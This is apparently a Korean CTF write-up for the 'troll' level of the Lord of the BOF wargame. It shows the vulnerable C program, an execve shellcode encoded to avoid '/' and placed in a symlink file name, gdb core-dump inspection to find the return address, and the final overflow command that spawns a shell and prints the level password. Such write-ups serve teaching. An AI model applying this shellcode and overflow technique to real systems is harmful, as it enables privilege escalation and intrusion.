# troll

```c
[orge@localhost orge]$ cat troll.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
```

argv[0]에 대한 제약이 사라지고 argc에 대한 조건과 argv[1]을 초기화 시키는 코드가 추가되었다. 

처음 든 생각은 argv[0]에 쉘코드를 넣어서 ret에 argv[0]의 주소를 덥어주면 될 것 같았다.

```bash
[orge@localhost orge]$ cp troll `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
cp: cannot create regular file `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                       ̀1▒̀': No such file or directory
[orge@localhost orge]$ ln -s troll `python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
ln: cannot create symbolic link `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                        ̀1▒̀' to `troll': No such file or directory
```

copy도 symbolic-link도 파일이 생성되지 않는다.

모르겠어서 아는 동생에게 물었더니 리눅스 시스템에 대해서 알려줬다. 

파일 이름에 '/'가 들어가면 안되는 조건이 있으니 쉘코드에서 /를 빼고 만들면 된다고 해서 '2f'(/)가 없는 쉘코드를 찾아 공격 해보겠다.

일단 링크 파일 이름에 2f가 없는 쉘코드를 넣어서 만든다. 쉘코드 전에 당연히 NOP sled를 넣어야한다. (그 앞에 문자를 넣는걸 까먹었다가 실행 시킬 수가 없어서 a라는 문자를 추가해서 만들었다)

```bash
[orge@localhost orge]$ ln -s troll `python -c 'print "a"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
[orge@localhost orge]$ ls
a????????????????????????????????????????????????????????????????????????????????????????????????????▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
troll
troll.c
```

*바로 쉘코드나 NOP sled를 넣어서 만들면 지우기도 어렵다.  지우는 방법은 ls -i 로 파일의 inode를 확인하고 find 명령어에 -exec로 rm명령어를 전달하면 된다.

```bash
[orge@localhost orge]$ ls -i
  48392 troll
  48391 troll.c
  48393 ????????????????????????????????????????????????????????????????????????????????????????????????????▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
  48394 ▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
[orge@localhost orge]$ find ./ -inum "48393" -exec /bin/rm {} \;
[orge@localhost orge]$ ls
troll  troll.c  ▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
[orge@localhost orge]$ find ./ -inum "48394" -exec /bin/rm {} \;
[orge@localhost orge]$ ls
troll  troll.c
```

이제 argv[0]의 주소를 알아내서 ret에 덥어 씌워주면 끝난다. 

일단 파일명의 길이가 비슷해야하므로 비슷한 파일을 복사한다.

```bahs
[orge@localhost orge]$ cp troll `python -c 'print "p"*150'`
[orge@localhost orge]$ ls
a????????????????????????????????????????????????????????????????????????????????????????????????????▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp
troll
troll.c
```

거의 비슷하다. 이제 p로 시작하는 복사본에 아무 문자나 채운다음 gdb로 core를 확인한다.

확인하면 p가 0x70이므로 0x70이 들어있는 부분중에 앞 부분을 골라 ret에 덥어 써준다.

```bash
[orge@localhost orge]$ ./pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp `python -c 'print "\x90"*44+"\xbf\xbf\xbf\xbf"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
Segmentation fault (core dumped)
[orge@localhost orge]$ gdb -c core -q
Core was generated by `./ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/100x $esp
0xbffff960:     0x00000000      0xbffff9a4      0xbffff9b0      0x40013868
0xbffff970:     0x00000002      0x08048450      0x00000000      0x08048471
0xbffff980:     0x08048500      0x00000002      0xbffff9a4      0x08048390
0xbffff990:     0x0804866c      0x4000ae60      0xbffff99c      0x40013e90
0xbffff9a0:     0x00000002      0xbffffa9d      0xbffffb36      0x00000000
0xbffff9b0:     0xbffffb67      0xbffffb76      0xbffffb8e      0xbffffbad
0xbffff9c0:     0xbffffbcf      0xbffffbd9      0xbffffd9c      0xbffffdbb
0xbffff9d0:     0xbffffdd5      0xbffffdea      0xbffffe06      0xbffffe11
0xbffff9e0:     0xbffffe1e      0xbffffe26      0xbffffe30      0xbffffe40
0xbffff9f0:     0xbffffe4e      0xbffffe5c      0xbffffe6d      0xbffffe78
0xbffffa00:     0xbffffe88      0xbffffec8      0x00000000      0x00000003
0xbffffa10:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffa20:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffa30:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffa40:     0x08048450      0x0000000b      0x000001fb      0x0000000c
0xbffffa50:     0x000001fb      0x0000000d      0x000001fb      0x0000000e
0xbffffa60:     0x000001fb      0x00000010      0x0fabfbff      0x0000000f
0xbffffa70:     0xbffffa98      0x00000000      0x00000000      0x00000000
0xbffffa80:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffa90:     0x00000000      0x00000000      0x36383669      0x702f2e00
0xbffffaa0:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffab0:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffac0:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffad0:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffae0:     0x70707070      0x70707070      0x70707070      0x70707070
(gdb)
0xbffffaf0:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffb00:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffb10:     0x70707070      0x70707070      0x70707070      0x70707070
0xbffffb20:     0x70707070      0x70707070      0x70707070      0x70707070
```

나는 NOP sled가 위치해 있을거 같은 0xbffffab0를 골랐다. 이제 공격해보자.

```bash
[orge@localhost orge]$ ./a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒"'`▒▒▒▒▒▒▒▒▒▒▒^Q^1ɱ2▒l^N▒^A▒▒^Au▒▒^E▒▒▒▒▒2▒Qi00tii0cjo▒▒QT▒⚱^L΁ `python -c 'print "\x90"*44+"\xb0\xfa\xff\xbf
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
bash$ whoami
troll
bash$ my-pass
euid = 508
aspirin
```

troll의 password는 aspirin이다.